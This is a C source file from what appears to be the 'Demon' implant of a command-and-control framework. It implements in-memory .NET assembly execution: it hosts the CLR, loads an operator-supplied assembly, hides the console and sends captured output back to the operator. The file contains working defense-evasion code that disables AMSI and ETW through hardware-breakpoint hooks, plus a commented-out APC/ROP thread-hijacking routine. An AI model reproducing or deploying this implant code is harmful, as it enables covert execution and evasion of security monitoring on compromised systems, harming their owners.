#include <Demon.h>

#include <core/MiniStd.h>
#include <core/Dotnet.h>
#include <core/HwBpExceptions.h>
#include <core/Runtime.h>

#define PIPE_BUFFER 0x10000 * 5

GUID xCLSID_CLRMetaHost     = { 0x9280188d, 0xe8e,  0x4867, { 0xb3, 0xc,  0x7f, 0xa8, 0x38, 0x84, 0xe8, 0xde } };
GUID xCLSID_CorRuntimeHost  = { 0xcb2f6723, 0xab3a, 0x11d2, { 0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e } };
GUID xIID_AppDomain         = { 0x05F696DC, 0x2B29, 0x3663, { 0xAD, 0x8B, 0xC4, 0x38, 0x9C, 0xF2, 0xA7, 0x13 } };
GUID xIID_ICLRMetaHost      = { 0xD332DB9E, 0xB9B3, 0x4125, { 0x82, 0x07, 0xA1, 0x48, 0x84, 0xF5, 0x32, 0x16 } };
GUID xIID_ICLRRuntimeInfo   = { 0xBD39D1D2, 0xBA2F, 0x486a, { 0x89, 0xB0, 0xB4, 0xB0, 0xCB, 0x46, 0x68, 0x91 } };
GUID xIID_ICorRuntimeHost   = { 0xcb2f6722, 0xab3a, 0x11d2, { 0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e } };

BOOL AmsiPatched = FALSE;

BOOL DotnetExecute( BUFFER Assembly, BUFFER Arguments )
{
    PPACKAGE       PackageInfo    = NULL;
    SAFEARRAYBOUND RgsBound[ 1 ]  = { 0 };
    BUFFER         AssemblyData   = { 0 };
    LPWSTR*        ArgumentsArray = NULL;
    INT            ArgumentsCount = 0;
    LONG           idx[ 1 ]       = { 0 };
    VARIANT        Object         = { 0 };
    NTSTATUS       Status         = STATUS_SUCCESS;
    DWORD          ThreadId       = 0;
    HRESULT        Result         = S_OK;
    BOOL           AmsiIsLoaded   = FALSE;

    if ( ! Assembly.Buffer || ! Assembly.Length )
        return FALSE;

    /* Create a named pipe for our output. try with anon pipes at some point. */
    ((INSTANCE *)Instance)->Dotnet->Pipe = ((INSTANCE *)Instance)->Win32.CreateNamedPipeW(
        ((INSTANCE *)Instance)->Dotnet->PipeName.Buffer,
        PIPE_ACCESS_DUPLEX | FILE_FLAG_FIRST_PIPE_INSTANCE,
        PIPE_TYPE_MESSAGE,
        PIPE_UNLIMITED_INSTANCES,
        PIPE_BUFFER, PIPE_BUFFER,
        0,
        NULL
    );

    if ( ! ((INSTANCE *)Instance)->Dotnet->Pipe )
    {
        PRINTF( "CreateNamedPipeW Failed: Error[%d]\n", NtGetLastError() )
        PACKAGE_ERROR_WIN32;

        return FALSE;
    }

    if ( ! ( ((INSTANCE *)Instance)->Dotnet->File = ((INSTANCE *)Instance)->Win32.CreateFileW( ((INSTANCE *)Instance)->Dotnet->PipeName.Buffer, GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL ) ) )
    {
        PRINTF( "CreateFileW Failed: Error[%d]\n", NtGetLastError() )
        PACKAGE_ERROR_WIN32;

        return FALSE;
    }

    if ( ! ((INSTANCE *)Instance)->Win32.GetConsoleWindow( ) )
    {
        HWND wnd = NULL;

        ((INSTANCE *)Instance)->Win32.AllocConsole( );

        if ( ( wnd = ((INSTANCE *)Instance)->Win32.GetConsoleWindow( ) ) )
            ((INSTANCE *)Instance)->Win32.ShowWindow( wnd, SW_HIDE );
    }

    //
    // hosting common language runtime
    //
    if ( ! ClrCreateInstance(
        ((INSTANCE *)Instance)->Dotnet->NetVersion.Buffer,
        & ((INSTANCE *)Instance)->Dotnet->MetaHost,
        & ((INSTANCE *)Instance)->Dotnet->ClrRuntimeInfo,
        & ((INSTANCE *)Instance)->Dotnet->ICorRuntimeHost
    ) ) {
        PUTS( "Couldn't start CLR" )
        return FALSE;
    }

    /* if Amsi/Etw bypass is enabled */
    if ( ((INSTANCE *)Instance)->Config.Implant.AmsiEtwPatch == AMSIETW_PATCH_HWBP )
    {
#if _WIN64
        PUTS( "Try to patch(less) Amsi/Etw" )

        PackageInfo = PackageCreateWithRequestID( DEMON_COMMAND_ASSEMBLY_INLINE_EXECUTE, ((INSTANCE *)Instance)->Dotnet->RequestID );
        PackageAddInt32( PackageInfo, DOTNET_INFO_PATCHED );

        /* check if Amsi is loaded */
        AmsiIsLoaded = TRUE;
        if ( ! ((INSTANCE *)Instance)->Modules.Amsi ) {
            AmsiIsLoaded = RtAmsi();
        }

        PUTS( "Init HwBp Engine" )
        /* use global engine */
        if ( ! NT_SUCCESS( HwBpEngineInit( NULL, NULL ) ) ) {
            return FALSE;
        }

        ThreadId = U_PTR( ((INSTANCE *)Instance)->Teb->ClientId.UniqueThread );

        /* add Amsi bypass */
        if ( AmsiIsLoaded )
        {
            PUTS( "HwBp Engine add AmsiScanBuffer bypass" )
            if ( ! NT_SUCCESS( Status = HwBpEngineAdd( NULL, ThreadId, ((INSTANCE *)Instance)->Win32.AmsiScanBuffer, HwBpExAmsiScanBuffer, 0 ) ) ) {
                PRINTF( "Failed adding exception to HwBp Engine: %08x\n", Status )
                return FALSE;
            }
        }

        /* add Etw bypass */
        PUTS( "HwBp Engine add NtTraceEvent bypass" )
        if ( ! NT_SUCCESS( HwBpEngineAdd( NULL, ThreadId, ((INSTANCE *)Instance)->Win32.NtTraceEvent, HwBpExNtTraceEvent, 1 ) ) ) {
            PRINTF( "Failed adding exception to HwBp Engine: %08x\n", Status )
            return FALSE;
        }

        PackageTransmit( PackageInfo );
        PackageInfo = NULL;
#endif
    }
    else if ( ((INSTANCE *)Instance)->Config.Implant.AmsiEtwPatch == AMSIETW_PATCH_MEMORY ) {
        /* todo: add memory patching technique */
    }
    else {
        /* no patching */
    }

    /* Let the operator know what version we are going to use. */
    PackageInfo = PackageCreateWithRequestID( DEMON_COMMAND_ASSEMBLY_INLINE_EXECUTE, ((INSTANCE *)Instance)->Dotnet->RequestID );
    PackageAddInt32( PackageInfo, DOTNET_INFO_NET_VERSION );
    PackageAddBytes( PackageInfo, ((INSTANCE *)Instance)->Dotnet->NetVersion.Buffer, ((INSTANCE *)Instance)->Dotnet->NetVersion.Length );
    PackageTransmit( PackageInfo );
    PackageInfo = NULL;

    RgsBound[ 0 ].cElements    = Assembly.Length;
    RgsBound[ 0 ].lLbound      = 0;
    ((INSTANCE *)Instance)->Dotnet->SafeArray = ((INSTANCE *)Instance)->Win32.SafeArrayCreate( VT_UI1, 1, RgsBound );

    PUTS( "CreateDomain..." )
    if ( ( Result = ((INSTANCE *)Instance)->Dotnet->ICorRuntimeHost->lpVtbl->CreateDomain( ((INSTANCE *)Instance)->Dotnet->ICorRuntimeHost, ((INSTANCE *)Instance)->Dotnet->AppDomainName.Buffer, NULL, &((INSTANCE *)Instance)->Dotnet->AppDomainThunk ) ) ) {
        PRINTF( "CreateDomain Failed: %x\n", Result )
        return FALSE;
    }

    PUTS( "QueryInterface..." )
    if ( ( Result = ((INSTANCE *)Instance)->Dotnet->AppDomainThunk->lpVtbl->QueryInterface( ((INSTANCE *)Instance)->Dotnet->AppDomainThunk, &xIID_AppDomain, (LPVOID*)&((INSTANCE *)Instance)->Dotnet->AppDomain ) ) ) {
        PRINTF( "QueryInterface Failed: %x\n", Result )
        return FALSE;
    }

    if ( ( Result = ((INSTANCE *)Instance)->Win32.SafeArrayAccessData( ((INSTANCE *)Instance)->Dotnet->SafeArray, &AssemblyData.Buffer ) ) ) {
        PRINTF( "SafeArrayAccessData Failed: %x\n", Result )
        return FALSE;
    }

    PUTS( "Copy assembly to buffer..." )
    MemCopy( AssemblyData.Buffer, Assembly.Buffer, Assembly.Length );

    if ( ( Result = ((INSTANCE *)Instance)->Win32.SafeArrayUnaccessData( ((INSTANCE *)Instance)->Dotnet->SafeArray ) ) ) {
        PRINTF("SafeArrayUnaccessData Failed: %x\n", Result )
        PACKAGE_ERROR_WIN32
    }

    PUTS( "AppDomain Load..." )
    if ( ( Result = ((INSTANCE *)Instance)->Dotnet->AppDomain->lpVtbl->Load_3( ((INSTANCE *)Instance)->Dotnet->AppDomain, ((INSTANCE *)Instance)->Dotnet->SafeArray, &((INSTANCE *)Instance)->Dotnet->Assembly ) ) ) {
        PRINTF( "AppDomain Failed: %x\n", Result )
        return FALSE;
    }

    PUTS( "Assembly EntryPoint..." )
    if ( ( Result = ((INSTANCE *)Instance)->Dotnet->Assembly->lpVtbl->EntryPoint( ((INSTANCE *)Instance)->Dotnet->Assembly, &((INSTANCE *)Instance)->Dotnet->MethodInfo ) ) ) {
        PRINTF( "Assembly EntryPoint Failed: %x\n", Result )
        return FALSE;
    }

    ((INSTANCE *)Instance)->Dotnet->MethodArgs = ((INSTANCE *)Instance)->Win32.SafeArrayCreateVector( VT_VARIANT, 0, 1 ); //Last field -> entryPoint == 1 is needed if Main(String[] args) 0 if Main()

    ArgumentsArray = ((INSTANCE *)Instance)->Win32.CommandLineToArgvW( Arguments.Buffer, &ArgumentsCount );
    ArgumentsArray++;
    ArgumentsCount--;

    ((INSTANCE *)Instance)->Dotnet->vtPsa.vt     = ( VT_ARRAY | VT_BSTR );
    ((INSTANCE *)Instance)->Dotnet->vtPsa.parray = ((INSTANCE *)Instance)->Win32.SafeArrayCreateVector( VT_BSTR, 0, ArgumentsCount );

    for ( LONG i = 0; i < ArgumentsCount; i++ ) {
        if ( ( Result = ((INSTANCE *)Instance)->Win32.SafeArrayPutElement( ((INSTANCE *)Instance)->Dotnet->vtPsa.parray, &i, ((INSTANCE *)Instance)->Win32.SysAllocString( ArgumentsArray[ i ] ) ) ) ) {
            PRINTF( "Args SafeArrayPutElement Failed: %x\n", Result )
            return FALSE;
        }
    }

    if ( ( Result = ((INSTANCE *)Instance)->Win32.SafeArrayPutElement( ((INSTANCE *)Instance)->Dotnet->MethodArgs, idx, &((INSTANCE *)Instance)->Dotnet->vtPsa ) ) ) {
        PRINTF( "SafeArrayPutElement Failed: %x\n", Result )
            return FALSE;
    }

    ((INSTANCE *)Instance)->Dotnet->StdOut = ((INSTANCE *)Instance)->Win32.GetStdHandle( STD_OUTPUT_HANDLE );
    ((INSTANCE *)Instance)->Win32.SetStdHandle( STD_OUTPUT_HANDLE , ((INSTANCE *)Instance)->Dotnet->File );

    if ( ( Result = ((INSTANCE *)Instance)->Dotnet->MethodInfo->lpVtbl->Invoke_3( ((INSTANCE *)Instance)->Dotnet->MethodInfo, Object, ((INSTANCE *)Instance)->Dotnet->MethodArgs, &((INSTANCE *)Instance)->Dotnet->Return ) ) ) {
        PRINTF( "Invoke Assembly Failed: %x\n", Result )
        return FALSE;
    }

    ((INSTANCE *)Instance)->Dotnet->Invoked = TRUE;

    /* push output */
    DotnetPush();


    /*
     * TODO: Finish/Fix this.
     *       It seems like its way to unstable to use this
     *       assembly crashes the agent randomly and dont know why.
     *       Fix this once i get motivated enough or remove this entirely. */

    /*
    PUTS( "Create Thread..." )

    MemSet( &ThreadAttr, 0, sizeof( PROC_THREAD_ATTRIBUTE_NUM ) );
    MemSet( &ClientId, 0, sizeof( CLIENT_ID ) );

    ThreadAttr.Entry.Attribute = ProcThreadAttributeValue( PsAttributeClientId, TRUE, FALSE, FALSE );
    ThreadAttr.Entry.Size      = sizeof( CLIENT_ID );
    ThreadAttr.Entry.pValue    = &ClientId;
    ThreadAttr.Length          = sizeof( NT_PROC_THREAD_ATTRIBUTE_LIST );

    PUTS( "Creating events..." )
    if ( NT_SUCCESS( ((INSTANCE *)Instance)->Win32.NtCreateEvent( &((INSTANCE *)Instance)->Dotnet->Event, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE ) ) &&
         NT_SUCCESS( ((INSTANCE *)Instance)->Win32.NtCreateEvent( &((INSTANCE *)Instance)->Dotnet->Exit,  EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE ) ) )
    {
        if ( NT_SUCCESS( ((INSTANCE *)Instance)->Win32.NtCreateThreadEx( &((INSTANCE *)Instance)->Dotnet->Thread, THREAD_ALL_ACCESS, NULL, NtCurrentProcess(), ((INSTANCE *)Instance)->Config.Implant.ThreadStartAddr, NULL, TRUE, 0, 0x10000 * 20, 0x10000 * 20, &ThreadAttr ) ) )
        {
            ((INSTANCE *)Instance)->Dotnet->RopInit = MmHeapAlloc( sizeof( CONTEXT ) );
            ((INSTANCE *)Instance)->Dotnet->RopInvk = MmHeapAlloc( sizeof( CONTEXT ) );
            ((INSTANCE *)Instance)->Dotnet->RopEvnt = MmHeapAlloc( sizeof( CONTEXT ) );
            ((INSTANCE *)Instance)->Dotnet->RopExit = MmHeapAlloc( sizeof( CONTEXT ) );

            ((INSTANCE *)Instance)->Dotnet->RopInit->ContextFlags = CONTEXT_FULL;
            if ( NT_SUCCESS( ((INSTANCE *)Instance)->Win32.NtGetContextThread( ((INSTANCE *)Instance)->Dotnet->Thread, ((INSTANCE *)Instance)->Dotnet->RopInit ) ) )
            {
                MemCopy( ((INSTANCE *)Instance)->Dotnet->RopInvk, ((INSTANCE *)Instance)->Dotnet->RopInit, sizeof( CONTEXT ) );
                MemCopy( ((INSTANCE *)Instance)->Dotnet->RopEvnt, ((INSTANCE *)Instance)->Dotnet->RopInit, sizeof( CONTEXT ) );
                MemCopy( ((INSTANCE *)Instance)->Dotnet->RopExit, ((INSTANCE *)Instance)->Dotnet->RopInit, sizeof( CONTEXT ) );

                // This rop executes the entrypoint of the assembly
                ((INSTANCE *)Instance)->Dotnet->RopInvk->ContextFlags  = CONTEXT_FULL;
                ((INSTANCE *)Instance)->Dotnet->RopInvk->Rsp          -= U_PTR( 0x1000 * 6 );
                ((INSTANCE *)Instance)->Dotnet->RopInvk->Rip           = U_PTR( ((INSTANCE *)Instance)->Dotnet->MethodInfo->lpVtbl->Invoke_3 );
                ((INSTANCE *)Instance)->Dotnet->RopInvk->Rcx           = U_PTR( ((INSTANCE *)Instance)->Dotnet->MethodInfo );
                ((INSTANCE *)Instance)->Dotnet->RopInvk->Rdx           = U_PTR( &Object );
                ((INSTANCE *)Instance)->Dotnet->RopInvk->R8            = U_PTR( ((INSTANCE *)Instance)->Dotnet->MethodArgs );
                ((INSTANCE *)Instance)->Dotnet->RopInvk->R9            = U_PTR( &((INSTANCE *)Instance)->Dotnet->Return );
                *( PVOID* )( ((INSTANCE *)Instance)->Dotnet->RopInvk->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = U_PTR( ((INSTANCE *)Instance)->Win32.NtTestAlert );

                // This rop tells the main thread (our agent main thread) that the assembly executable finished executing
                ((INSTANCE *)Instance)->Dotnet->RopEvnt->ContextFlags  = CONTEXT_FULL;
                ((INSTANCE *)Instance)->Dotnet->RopEvnt->Rsp          -= U_PTR( 0x1000 * 5 );
                ((INSTANCE *)Instance)->Dotnet->RopEvnt->Rip           = U_PTR( ((INSTANCE *)Instance)->Win32.NtSetEvent );
                ((INSTANCE *)Instance)->Dotnet->RopEvnt->Rcx           = U_PTR( ((INSTANCE *)Instance)->Dotnet->Event );
                ((INSTANCE *)Instance)->Dotnet->RopEvnt->Rdx           = U_PTR( NULL );
                *( PVOID* )( ((INSTANCE *)Instance)->Dotnet->RopEvnt->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = U_PTR( ((INSTANCE *)Instance)->Win32.NtTestAlert );

                // Wait til we freed everything from the dotnet
                ((INSTANCE *)Instance)->Dotnet->RopExit->ContextFlags  = CONTEXT_FULL;
                ((INSTANCE *)Instance)->Dotnet->RopExit->Rsp          -= U_PTR( 0x1000 * 4 );
                ((INSTANCE *)Instance)->Dotnet->RopExit->Rip           = U_PTR( ((INSTANCE *)Instance)->Win32.NtWaitForSingleObject );
                ((INSTANCE *)Instance)->Dotnet->RopExit->Rcx           = U_PTR( ((INSTANCE *)Instance)->Dotnet->Exit );
                ((INSTANCE *)Instance)->Dotnet->RopExit->Rdx           = U_PTR( FALSE );
                ((INSTANCE *)Instance)->Dotnet->RopExit->R8            = U_PTR( NULL );
                *( PVOID* )( ((INSTANCE *)Instance)->Dotnet->RopExit->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = U_PTR( ((INSTANCE *)Instance)->Win32.NtTestAlert );

                if ( ! NT_SUCCESS( ((INSTANCE *)Instance)->Win32.NtQueueApcThread( ((INSTANCE *)Instance)->Dotnet->Thread, ((INSTANCE *)Instance)->Win32.NtContinue, ((INSTANCE *)Instance)->Dotnet->RopInvk, FALSE, NULL ) ) ) goto Leave;
                if ( ! NT_SUCCESS( ((INSTANCE *)Instance)->Win32.NtQueueApcThread( ((INSTANCE *)Instance)->Dotnet->Thread, ((INSTANCE *)Instance)->Win32.NtContinue, ((INSTANCE *)Instance)->Dotnet->RopEvnt, FALSE, NULL ) ) ) goto Leave;
                if ( ! NT_SUCCESS( ((INSTANCE *)Instance)->Win32.NtQueueApcThread( ((INSTANCE *)Instance)->Dotnet->Thread, ((INSTANCE *)Instance)->Win32.NtContinue, ((INSTANCE *)Instance)->Dotnet->RopExit, FALSE, NULL ) ) ) goto Leave;

                PUTS( "Resume Thread..." )
                if ( NT_SUCCESS( ((INSTANCE *)Instance)->Win32.NtAlertResumeThread( ((INSTANCE *)Instance)->Dotnet->Thread, NULL ) ) )
                {
                    PUTS( "Apc started and assembly invoked." )

                    PackageInfo = PackageCreate( DEMON_COMMAND_ASSEMBLY_INLINE_EXECUTE );
                    PackageAddInt32( PackageInfo, DOTNET_INFO_ENTRYPOINT_EXECUTED );
                    PackageAddInt32( PackageInfo, ClientId.UniqueThread );
                    PackageTransmit( PackageInfo );

                    // we have successfully invoked the main function of the assembly executable.
                    ((INSTANCE *)Instance)->Dotnet->Invoked = TRUE;

                } else PUTS( "NtAlertResumeThread failed" )

            } else PUTS( "NtGetThreadContext failed" )

        } else PUTS( "NtCreateThreadEx failed" )

    } else PUTS( "NtCreateEvent failed" )
    */

    return TRUE;
}

/* push anything from the pipe */
VOID DotnetPushPipe()
{
    DWORD Read      = 0;
    DWORD BytesRead = 0;

    if ( ! ((INSTANCE *)Instance)->Dotnet )
        return;

    /* see how much there is in the named pipe */
    if ( ((INSTANCE *)Instance)->Win32.PeekNamedPipe( ((INSTANCE *)Instance)->Dotnet->Pipe, NULL, 0, NULL, &Read, NULL ) )
    {
        PRINTF( "Read: %d\n", Read );

        if ( Read > 0 )
        {
            ((INSTANCE *)Instance)->Dotnet->Output.Length = Read;
            ((INSTANCE *)Instance)->Dotnet->Output.Buffer = MmHeapAlloc( ((INSTANCE *)Instance)->Dotnet->Output.Length );

            ((INSTANCE *)Instance)->Win32.ReadFile( ((INSTANCE *)Instance)->Dotnet->Pipe, ((INSTANCE *)Instance)->Dotnet->Output.Buffer, ((INSTANCE *)Instance)->Dotnet->Output.Length, &BytesRead, NULL );
            ((INSTANCE *)Instance)->Dotnet->Output.Length = BytesRead;

            PPACKAGE Package = PackageCreateWithRequestID( DEMON_OUTPUT, ((INSTANCE *)Instance)->Dotnet->RequestID );
            PackageAddBytes( Package, ((INSTANCE *)Instance)->Dotnet->Output.Buffer, ((INSTANCE *)Instance)->Dotnet->Output.Length );
            PackageTransmit( Package );

            if ( ((INSTANCE *)Instance)->Dotnet->Output.Buffer )
            {
                MemSet( ((INSTANCE *)Instance)->Dotnet->Output.Buffer, 0, Read );
                MmHeapFree( ((INSTANCE *)Instance)->Dotnet->Output.Buffer );
                ((INSTANCE *)Instance)->Dotnet->Output.Buffer = NULL;
            }
        }
    }
}

VOID DotnetPush()
{
    if ( ! ((INSTANCE *)Instance)->Dotnet )
        return;

    PRINTF( "Instance->Dotnet->Invoked: %s\n", ((INSTANCE *)Instance)->Dotnet->Invoked ? "TRUE" : "FALSE" )
    if ( ((INSTANCE *)Instance)->Dotnet->Invoked )
    {
        /* Read from the assembly named pipe and send it to the server */
        DotnetPushPipe();

        /* check if the assembly is still running. */
        /* if ( ((INSTANCE *)Instance)->Win32.WaitForSingleObjectEx( ((INSTANCE *)Instance)->Dotnet->Event, 0, FALSE ) == WAIT_OBJECT_0 )
        {
            PUTS( "Event has been signaled" )

            Package = PackageCreate( DEMON_COMMAND_ASSEMBLY_INLINE_EXECUTE );
            PackageAddInt32( Package, DOTNET_INFO_FINISHED );
            PackageTransmit( Package );

            PUTS( "Dotnet Invoke thread isn't active anymore." )
            Close = TRUE;
        } */

        /* just in case the assembly pushed something last minute... */
        DotnetPushPipe();

        /* Now free everything */
        DotnetClose();
    }
}

VOID DotnetClose()
{
#ifndef DEBUG
    ((INSTANCE *)Instance)->Win32.FreeConsole();
#endif

    if ( ((INSTANCE *)Instance)->Config.Implant.AmsiEtwPatch == AMSIETW_PATCH_HWBP ) {
        HwBpEngineDestroy( NULL );
    }

    if ( ((INSTANCE *)Instance)->Dotnet->Event ) {
        SysNtClose( ((INSTANCE *)Instance)->Dotnet->Event );
    }

    if ( ((INSTANCE *)Instance)->Dotnet->Pipe ) {
        SysNtClose( ((INSTANCE *)Instance)->Dotnet->Pipe );
    }

    if ( ((INSTANCE *)Instance)->Dotnet->File ) {
        SysNtClose( ((INSTANCE *)Instance)->Dotnet->File );
    }

    if ( ((INSTANCE *)Instance)->Dotnet->RopInit ) {
        MemSet( ((INSTANCE *)Instance)->Dotnet->RopInit, 0, sizeof( CONTEXT ) );
        ((INSTANCE *)Instance)->Win32.LocalFree( ((INSTANCE *)Instance)->Dotnet->RopInit );
        ((INSTANCE *)Instance)->Dotnet->RopInit = NULL;
    }

    if ( ((INSTANCE *)Instance)->Dotnet->RopInvk )
    {
        MemSet( ((INSTANCE *)Instance)->Dotnet->RopInvk, 0, sizeof( CONTEXT ) );
        ((INSTANCE *)Instance)->Win32.LocalFree( ((INSTANCE *)Instance)->Dotnet->RopInvk );
        ((INSTANCE *)Instance)->Dotnet->RopInvk = NULL;
    }

    if ( ((INSTANCE *)Instance)->Dotnet->RopEvnt )
    {
        MemSet( ((INSTANCE *)Instance)->Dotnet->RopEvnt, 0, sizeof( CONTEXT ) );
        ((INSTANCE *)Instance)->Win32.LocalFree( ((INSTANCE *)Instance)->Dotnet->RopEvnt );
        ((INSTANCE *)Instance)->Dotnet->RopEvnt = NULL;
    }

    if ( ((INSTANCE *)Instance)->Dotnet->RopExit )
    {
        MemSet( ((INSTANCE *)Instance)->Dotnet->RopExit, 0, sizeof( CONTEXT ) );
        ((INSTANCE *)Instance)->Win32.LocalFree( ((INSTANCE *)Instance)->Dotnet->RopExit );
        ((INSTANCE *)Instance)->Dotnet->RopExit = NULL;
    }

    PUTS( "Free Output" )
    if ( ((INSTANCE *)Instance)->Dotnet->Output.Buffer )
    {
        MemSet( ((INSTANCE *)Instance)->Dotnet->Output.Buffer, 0, ((INSTANCE *)Instance)->Dotnet->Output.Length );
        ((INSTANCE *)Instance)->Win32.LocalFree( ((INSTANCE *)Instance)->Dotnet->Output.Buffer );
        ((INSTANCE *)Instance)->Dotnet->Output.Buffer = NULL;
    }

    PUTS( "Unload and free CLR" )
    if ( ((INSTANCE *)Instance)->Dotnet->MethodArgs )
    {
        ((INSTANCE *)Instance)->Win32.SafeArrayDestroy( ((INSTANCE *)Instance)->Dotnet->MethodArgs );
        ((INSTANCE *)Instance)->Dotnet->MethodArgs = NULL;
    }

    if ( ((INSTANCE *)Instance)->Dotnet->MethodInfo != NULL )
    {
        ((INSTANCE *)Instance)->Dotnet->MethodInfo->lpVtbl->Release( ((INSTANCE *)Instance)->Dotnet->MethodInfo );
        ((INSTANCE *)Instance)->Dotnet->MethodInfo = NULL;
    }

    if ( ((INSTANCE *)Instance)->Dotnet->Assembly != NULL )
    {
        ((INSTANCE *)Instance)->Dotnet->Assembly->lpVtbl->Release( ((INSTANCE *)Instance)->Dotnet->Assembly );
        ((INSTANCE *)Instance)->Dotnet->Assembly = NULL;
    }

    if ( ((INSTANCE *)Instance)->Dotnet->AppDomain )
    {
        ((INSTANCE *)Instance)->Dotnet->AppDomain->lpVtbl->Release( ((INSTANCE *)Instance)->Dotnet->AppDomain );
        ((INSTANCE *)Instance)->Dotnet->AppDomain = NULL;
    }

    if ( ((INSTANCE *)Instance)->Dotnet->AppDomainThunk != NULL )
    {
        ((INSTANCE *)Instance)->Dotnet->AppDomainThunk->lpVtbl->Release( ((INSTANCE *)Instance)->Dotnet->AppDomainThunk );
    }

    if ( ((INSTANCE *)Instance)->Dotnet->ICorRuntimeHost )
    {
        ((INSTANCE *)Instance)->Dotnet->ICorRuntimeHost->lpVtbl->UnloadDomain( ((INSTANCE *)Instance)->Dotnet->ICorRuntimeHost, ((INSTANCE *)Instance)->Dotnet->AppDomainThunk );
        ((INSTANCE *)Instance)->Dotnet->ICorRuntimeHost->lpVtbl->Stop( ((INSTANCE *)Instance)->Dotnet->ICorRuntimeHost );
        ((INSTANCE *)Instance)->Dotnet->ICorRuntimeHost = NULL;
    }

    if ( ((INSTANCE *)Instance)->Dotnet->ClrRuntimeInfo != NULL )
    {
        ((INSTANCE *)Instance)->Dotnet->ClrRuntimeInfo->lpVtbl->Release( ((INSTANCE *)Instance)->Dotnet->ClrRuntimeInfo );
        ((INSTANCE *)Instance)->Dotnet->ClrRuntimeInfo = NULL;
    }

    if ( ((INSTANCE *)Instance)->Dotnet->MetaHost != NULL )
    {
        ((INSTANCE *)Instance)->Dotnet->MetaHost->lpVtbl->Release( ((INSTANCE *)Instance)->Dotnet->MetaHost );
        ((INSTANCE *)Instance)->Dotnet->MetaHost = NULL;
    }

    if ( ((INSTANCE *)Instance)->Dotnet->Thread ) {
        SysNtTerminateThread( ((INSTANCE *)Instance)->Dotnet->Thread, 0 );
        SysNtClose( ((INSTANCE *)Instance)->Dotnet->Thread );
    }

    if ( ((INSTANCE *)Instance)->Dotnet->Exit ) {
        SysNtClose( ((INSTANCE *)Instance)->Dotnet->Exit );
    }

    if ( ((INSTANCE *)Instance)->Dotnet ) {
        MemSet( ((INSTANCE *)Instance)->Dotnet, 0, sizeof( DOTNET_ARGS ) );
        MmHeapFree( ((INSTANCE *)Instance)->Dotnet );
        ((INSTANCE *)Instance)->Dotnet = NULL;
    }
}

BOOL FindVersion( PVOID Assembly, DWORD length )
{
    char* assembly_c;
    assembly_c = (char*)Assembly;
    char v4[] = { 0x76,0x34,0x2E,0x30,0x2E,0x33,0x30,0x33,0x31,0x39 };

    for (int i = 0; i < length; i++)
    {
        for (int j = 0; j < 10; j++)
        {
            if (v4[j] != assembly_c[i + j])
                break;
            else
            {
                if (j == (9))
                    return 1;
            }
        }
    }

    return 0;
}

DWORD ClrCreateInstance( LPCWSTR dotNetVersion, PICLRMetaHost *ppClrMetaHost, PICLRRuntimeInfo *ppClrRuntimeInfo, ICorRuntimeHost **ppICorRuntimeHost )
{
    BOOL fLoadable = FALSE;

    if ( RtMscoree() )
    {
        if ( ((INSTANCE *)Instance)->Win32.CLRCreateInstance( &xCLSID_CLRMetaHost, &xIID_ICLRMetaHost, (LPVOID*)ppClrMetaHost ) == S_OK )
        {
            if ( ( *ppClrMetaHost )->lpVtbl->GetRuntime( *ppClrMetaHost, dotNetVersion, &xIID_ICLRRuntimeInfo, (LPVOID*)ppClrRuntimeInfo ) == S_OK )
            {
                if ( ( ( *ppClrRuntimeInfo )->lpVtbl->IsLoadable( *ppClrRuntimeInfo, &fLoadable ) == S_OK ) && fLoadable )
                {
                    //Load the CLR into the current process and return a runtime interface pointer. -> CLR changed to ICor which is deprecated but works
                    if ( ( *ppClrRuntimeInfo )->lpVtbl->GetInterface( *ppClrRuntimeInfo, &xCLSID_CorRuntimeHost, &xIID_ICorRuntimeHost, (LPVOID*)ppICorRuntimeHost ) == S_OK )
                    {
                        //Start it. This is okay to call even if the CLR is already running
                        ( *ppICorRuntimeHost )->lpVtbl->Start( *ppICorRuntimeHost );
                    }
                    else
                    {
                        PRINTF("[-] ( GetInterface ) Process refusing to get interface of %ls CLR version.  Try running an assembly that requires a different CLR version.\n", dotNetVersion);
                        return 0;
                    }
                }
                else
                {
                    PRINTF("[-] ( IsLoadable ) Process refusing to load %ls CLR version.  Try running an assembly that requires a different CLR version.\n", dotNetVersion);
                    return 0;
                }
            }
            else
            {
                PRINTF("[-] ( GetRuntime ) Process refusing to get runtime of %ls CLR version.  Try running an assembly that requires a different CLR version.\n", dotNetVersion);
                return 0;
            }
        }
        else
        {
            PRINTF("[-] ( CLRCreateInstance ) Process refusing to create %ls CLR version.  Try running an assembly that requires a different CLR version.\n", dotNetVersion);
            return 0;
        }
    }
    else
    {
        PUTS("Failed to load mscoree.dll")
        return 0;
    }

    return 1;
}